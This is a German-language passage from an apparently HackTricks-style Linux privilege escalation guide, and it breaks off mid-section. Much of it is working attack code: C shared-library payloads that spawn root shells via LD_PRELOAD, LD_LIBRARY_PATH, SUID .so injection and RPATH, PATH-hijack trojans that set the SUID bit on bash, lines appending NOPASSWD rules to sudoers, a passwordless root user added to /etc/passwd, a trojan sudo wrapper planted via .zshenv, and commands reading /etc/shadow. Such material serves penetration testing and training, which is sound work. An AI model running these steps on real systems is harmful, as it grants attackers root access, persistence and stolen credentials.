Auf einigen älteren Distributionen kann sudo mit `requiretty` konfiguriert werden, wodurch sudo nur aus einem interaktiven TTY ausgeführt werden kann. Wenn `!requiretty` gesetzt ist (oder die Option fehlt), kann sudo aus nicht interaktiven Kontexten wie Reverse Shells, cron jobs oder Scripts ausgeführt werden.
```bash
Defaults !requiretty
```
Dies ist an sich keine direkte Schwachstelle, erweitert jedoch die Situationen, in denen sudo-Regeln ohne vollständige PTY missbraucht werden können.

### Sudo env_keep+=PATH / unsicherer secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` oder einen `secure_path` mit Einträgen zeigt, die der Angreifer beschreiben kann (z. B. `/home/<user>/bin`), kann jeder relative Befehl innerhalb des durch sudo erlaubten Ziels überschattet werden.

- Voraussetzungen: eine sudo-Regel (häufig `NOPASSWD`), die ein Script/Binary ausführt, das Befehle ohne absolute Pfade aufruft (`free`, `df`, `ps` usw.), sowie ein beschreibbarer PATH-Eintrag, der zuerst durchsucht wird.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Umgehen von Pfaden bei der Sudo-Ausführung
**Springe**, um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne command path

Wenn die **sudo permission** für einen einzelnen command **ohne Angabe des Pfads** gewährt wird: _hacker10 ALL= (root) less_, kannst du dies ausnutzen, indem du die PATH variable änderst
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid**-Binary **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (überprüfe den Inhalt eines ungewöhnlichen SUID-Binaries immer mit** _**strings**_ **)**.

[Payload-Beispiele zur Ausführung.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID-Binary mit Befehlspfad

Wenn das **suid**-Binary **einen anderen Befehl mit Angabe des Pfads ausführt**, kannst du versuchen, eine **Funktion** zu exportieren, die nach dem Befehl benannt ist, den die SUID-Datei aufruft.

Wenn ein SUID-Binary beispielsweise _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dann wird diese Funktion ausgeführt, wenn du die SUID-Binärdatei aufrufst.

### Schreibbares Script, das von einem SUID-Wrapper ausgeführt wird

Eine häufige Fehlkonfiguration bei benutzerdefinierten Apps ist ein Root-eigener SUID-Binärdatei-Wrapper, der ein Script ausführt, während das Script selbst für Benutzer mit niedrigen Berechtigungen schreibbar ist.

Typisches Muster:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Wenn `/usr/local/bin/backup.sh` beschreibbar ist, kannst du Payload-Befehle anhängen und anschließend den SUID-Wrapper ausführen:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Schnelle Überprüfungen:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Dieser Angriffsweg ist besonders häufig bei „maintenance“-/„backup“-Wrappers, die in `/usr/local/bin` ausgeliefert werden.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere Shared Libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang wird als Preloading einer Library bezeichnet.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion ausgenutzt wird, insbesondere bei **suid/sgid**-Executables, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD_PRELOAD** bei Executables, bei denen die reale User-ID (_ruid_) nicht mit der effektiven User-ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Libraries aus Standardpfaden vorab geladen, die ebenfalls suid/sgid sind.

Eine Privilege Escalation kann auftreten, wenn du die Möglichkeit hast, Commands mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration ermöglicht es, dass die Umgebungsvariable **LD_PRELOAD** auch bei der Ausführung von Commands mit `sudo` erhalten bleibt und erkannt wird, wodurch möglicherweise beliebiger Code mit erhöhten Privilegien ausgeführt werden kann.
```
Defaults        env_keep += LD_PRELOAD
```
Als **/tmp/pe.c** speichern
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompilieren Sie es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Führe schließlich eine **Privilege Escalation** durch
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die Umgebungsvariable **LD_LIBRARY_PATH** kontrolliert, da er den Pfad kontrolliert, in dem nach Bibliotheken gesucht wird.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn du auf ein Binary mit **SUID**-Berechtigungen stößt, das ungewöhnlich wirkt, solltest du überprüfen, ob es **.so**-Dateien ordnungsgemäß lädt. Dies kann mit folgendem Befehl überprüft werden:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Beispielsweise deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein potenzielles Exploit hin.

Um dies auszunutzen, würde man eine C-Datei, beispielsweise _"/path/to/.config/libcalc.c"_, erstellen, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt nach dem Kompilieren und Ausführen darauf ab, durch das Manipulieren von Dateiberechtigungen und das Ausführen einer Shell mit erhöhten Berechtigungen die Privilegien zu erweitern.

Kompiliere die obige C-Datei mit folgendem Befehl in eine Shared-Object-Datei (.so):
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID-Binary den Exploit auslösen und eine mögliche Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nachdem wir eine SUID-Binary gefunden haben, die eine Library aus einem Ordner lädt, in den wir schreiben können, erstellen wir die Library mit dem erforderlichen Namen in diesem Ordner:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn du einen Fehler wie diesen erhältst
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die von dir generierte library eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe für Fälle, in denen du **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten shells auszubrechen, Privilegien zu erhöhen oder aufrechtzuerhalten, Dateien zu übertragen, bind und reverse shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du auf `sudo -l` zugreifen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es eine Möglichkeit findet, eine sudo-Regel auszunutzen.

### Wiederverwenden von Sudo-Tokens

In Fällen, in denen du **sudo access** hast, aber das Passwort nicht kennst, kannst du deine Privilegien erhöhen, indem du **auf die Ausführung eines sudo-Befehls wartest und anschließend das Session-Token hijackst**.

Voraussetzungen für die Erhöhung der Privilegien:

- Du hast bereits eine shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15 Minuten `sudo`** verwendet, um etwas auszuführen (standardmäßig ist das die Gültigkeitsdauer des sudo-Tokens, das uns erlaubt, `sudo` ohne Eingabe eines Passworts zu verwenden)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist verfügbar (du musst es möglicherweise hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder `/etc/sysctl.d/10-ptrace.conf` dauerhaft ändern und `kernel.yama.ptrace_scope = 0` setzen.)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du deine Privilegien mit folgendem Tool erhöhen:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt die Binary `activate_sudo_token` in _/tmp_. Du kannst sie verwenden, um **das sudo-Token in deiner Session zu aktivieren** (du erhältst nicht automatisch eine root shell; führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, die **root gehört und setuid** hat.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte Exploit** (`exploit_v3.sh`) **erstellt eine sudoers-Datei**, die **sudo-Tokens dauerhaft macht und allen Benutzern die Verwendung von sudo erlaubt**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **Schreibrechte** für den Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und eine PID zu erstellen**.\
Wenn du beispielsweise die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit der PID 1234 hast, kannst du **sudo-Rechte erlangen**, ohne das Passwort kennen zu müssen, indem du Folgendes ausführst:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` legen fest, wer `sudo` verwenden darf und wie. Diese Dateien können **standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **interessante Informationen erhalten**, und wenn du eine beliebige Datei **schreiben** kannst, wirst du in der Lage sein, **deine Privilegien zu erweitern**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum Binary `sudo`, beispielsweise `doas` für OpenBSD. Denke daran, die Konfiguration unter `/etc/doas.conf` zu überprüfen.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Wenn `doas` einen Editor oder Interpreter erlaubt, prüfe GTFOBins-ähnliche Auswege:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Wenn du weißt, dass sich ein **Benutzer normalerweise mit einer Maschine verbindet und `sudo`** verwendet, um seine Berechtigungen zu erweitern, und du eine Shell im Kontext dieses Benutzers erhalten hast, kannst du eine **neue sudo-Executable erstellen**, die deinen Code als root und anschließend den Befehl des Benutzers ausführt. Danach kannst du den **$PATH** des Benutzerkontexts ändern (zum Beispiel, indem du den neuen Pfad in `.bash_profile` hinzufügst), sodass beim Ausführen von sudo deine sudo-Executable ausgeführt wird.

Beachte, dass du andere Dateien ändern musst, wenn der Benutzer eine andere Shell (nicht bash) verwendet, um den neuen Pfad hinzuzufügen. Zum Beispiel ändert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc` und `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder indem du etwas wie Folgendes ausführst:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Libraries** **gesucht** wird. Der Inhalt von `/etc/ld.so.conf.d/libc.conf` ist beispielsweise `/usr/local/lib`. **Das bedeutet, dass das System innerhalb von `/usr/local/lib` nach Libraries sucht**.

Falls **ein Benutzer Schreibberechtigungen** für einen der angegebenen Pfade besitzt: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, für eine Datei innerhalb von `/etc/ld.so.conf.d/` oder für einen in der Konfigurationsdatei unter `/etc/ld.so.conf.d/*.conf` angegebenen Ordner, kann er möglicherweise seine Berechtigungen erweitern.\
Siehe auf der folgenden Seite, **wie diese Fehlkonfiguration ausgenutzt wird**:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch das Kopieren der lib nach `/var/tmp/flag15/` wird sie vom Programm an diesem Ort verwendet, wie in der Variable `RPATH` angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstellen Sie anschließend eine bösartige Library in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities gewähren einem Prozess eine **Teilmenge der verfügbaren root-Berechtigungen**. Dadurch werden root-**Berechtigungen in kleinere und voneinander unabhängige Einheiten** aufgeteilt. Jede dieser Einheiten kann Prozessen anschließend unabhängig gewährt werden. Auf diese Weise wird der vollständige Berechtigungssatz reduziert, wodurch die Risiken einer Ausnutzung verringert werden.\
Lies die folgende Seite, um **mehr über Capabilities und deren Missbrauch zu erfahren**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betreffende Benutzer mit "**cd**" in den Ordner wechseln kann.\
Das **"read"-Bit** bedeutet, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"-Bit** bedeutet, dass der Benutzer neue **Dateien** **löschen** und **erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar und können die **traditionellen ugo/rwx-Berechtigungen überschreiben**. Diese Berechtigungen erweitern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Diese **Granularität ermöglicht eine präzisere Zugriffsverwaltung**. Weitere Details findest du [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gewähre** dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Abrufen** von Dateien mit bestimmten ACLs aus dem System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Versteckte ACL-Hintertür in sudoers-Drop-ins

Eine häufige Fehlkonfiguration ist eine root-owned Datei in `/etc/sudoers.d/` mit den Berechtigungen `440`, die einem Benutzer mit niedrigen Rechten über eine ACL dennoch Schreibzugriff gewährt.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Wenn du etwas wie `user:alice:rw-` siehst, kann der Benutzer trotz restriktiver Modus-Bits eine sudo-Regel anhängen:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Dies ist ein wirkungsvoller ACL persistence/privesc path, da er bei Prüfungen ausschließlich mit `ls -l` leicht übersehen wird.

## Offene Shell-Sitzungen

In **alten Versionen** können Sie möglicherweise eine **Shell**-Sitzung eines anderen Benutzers (**root**) **hijacken**.\
In **den neuesten Versionen** können Sie sich nur mit screen-Sitzungen Ihres **eigenen Benutzers** **verbinden**. Sie könnten jedoch **interessante Informationen innerhalb der Sitzung** finden.

### screen sessions hijacking

**screen-Sitzungen auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket-Speicherorte (auf manchen Systemen ist einer davon als Symlink auf den anderen verfügbar): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**An eine Session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **alten tmux-Versionen**. Ich konnte keine von root erstellte tmux-Session (v2.1) als nicht privilegierter Benutzer hijacken.

**tmux sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket-Speicherorte (einige Systeme stellen einen als Symlink des anderen bereit) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Mit diesem Socket auflisten, du kannst eine tmux-Session in diesem Socket starten...](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Prüfe **Valentine box from HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle auf Debian-basierten Systemen (Ubuntu, Kubuntu usw.) zwischen September 2006 und dem 13. Mai 2008 generierten SSL- und SSH-Schlüssel können von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erstellen eines neuen SSH-Schlüssels auf diesen Betriebssystemen auf, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **man anhand des öffentlichen SSH-Schlüssels nach dem zugehörigen privaten Schlüssel suchen kann**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Gibt an, ob die Passwortauthentifizierung erlaubt ist. Der Standardwert ist `no`.
- **PubkeyAuthentication:** Gibt an, ob die Authentifizierung mit öffentlichen Schlüsseln erlaubt ist. Der Standardwert ist `yes`.
- **PermitEmptyPasswords**: Wenn die Passwortauthentifizierung erlaubt ist, gibt dieser Wert an, ob der Server die Anmeldung bei Konten mit leeren Passwörtern erlaubt. Der Standardwert ist `no`.

### Login control files

Diese Dateien beeinflussen, wer sich anmelden kann und wie:

- **`/etc/nologin`**: Falls vorhanden, blockiert diese Datei Anmeldungen von Nicht-Root-Benutzern und gibt ihre Nachricht aus.
- **`/etc/securetty`**: Beschränkt, von wo aus sich root anmelden kann (TTY-Allowlist).
- **`/etc/motd`**: Banner nach der Anmeldung (kann Informationen über die Umgebung oder Wartungsdetails leaken).

### PermitRootLogin

Gibt an, ob sich root per SSH anmelden kann. Der Standardwert ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und privatem Schlüssel anmelden
- `without-password` oder `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
- `forced-commands-only`: Root kann sich nur mit einem privaten Schlüssel anmelden, und nur, wenn die commands-Optionen angegeben sind
- `no` : keine Anmeldung

### AuthorizedKeysFile

Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die zur Benutzerauthentifizierung verwendet werden können. Sie können tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade** (beginnend mit `/`) oder **relative Pfade ausgehend vom Home-Verzeichnis des Benutzers** angeben. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration gibt an, dass SSH beim Versuch, sich mit dem **privaten** Schlüssel des Benutzers "**testusername**" anzumelden, den öffentlichen Schlüssel deines Schlüssels mit den Schlüsseln in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleicht.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **deine lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel** (ohne Passphrases!) auf deinem Server zu hinterlassen. Dadurch kannst du dich per SSH **zu einem Host** **verbinden** und von dort aus **zu einem anderen** Host **weiterverbinden**, wobei du den **Schlüssel** verwendest, der auf deinem **ursprünglichen Host** liegt.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass der Host jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, auf die Schlüssel zugreifen kann, wenn `Host` auf `*` gesetzt ist (dies stellt ein Sicherheitsproblem dar).

Die Datei `/etc/ssh_config` kann diese **options** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann die Weiterleitung von ssh-agent mit dem Schlüsselwort `AllowAgentForwarding` erlauben oder verweigern (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da du dies möglicherweise **zur Rechteausweitung missbrauchen kannst**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profile-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Wenn du daher **eine dieser Dateien schreiben oder ändern kannst, kannst du deine Rechte ausweiten**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profile-Script gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd-/Shadow-Dateien

Je nach Betriebssystem können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es kann ein Backup vorhanden sein. Daher wird empfohlen, **alle zu finden** und zu **überprüfen, ob du sie lesen kannst**, um festzustellen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In manchen Fällen können sich **Passwort-Hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei) befinden
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbare /etc/passwd

Generiere zunächst mit einem der folgenden Befehle ein Passwort.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Fügen Sie anschließend den Benutzer `hacker` hinzu und setzen Sie das generierte Passwort.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst nun den Befehl `su` mit `hacker:hacker` verwenden.

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die aktuelle Sicherheit des Rechners beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`; außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du **in einige sensible Dateien schreiben** kannst. Kannst du beispielsweise in eine **Dienstkonfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel: Wenn auf dem Rechner ein **tomcat**-Server läuft und du die **Tomcat-Servicekonfigurationsdatei in /etc/systemd/ ändern kannst,** kannst du die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner überprüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du den letzten Ordner nicht lesen können, aber versuche es)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dateien an ungewöhnlichen Speicherorten/im Besitz
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### In den letzten Minuten geänderte Dateien
```bash
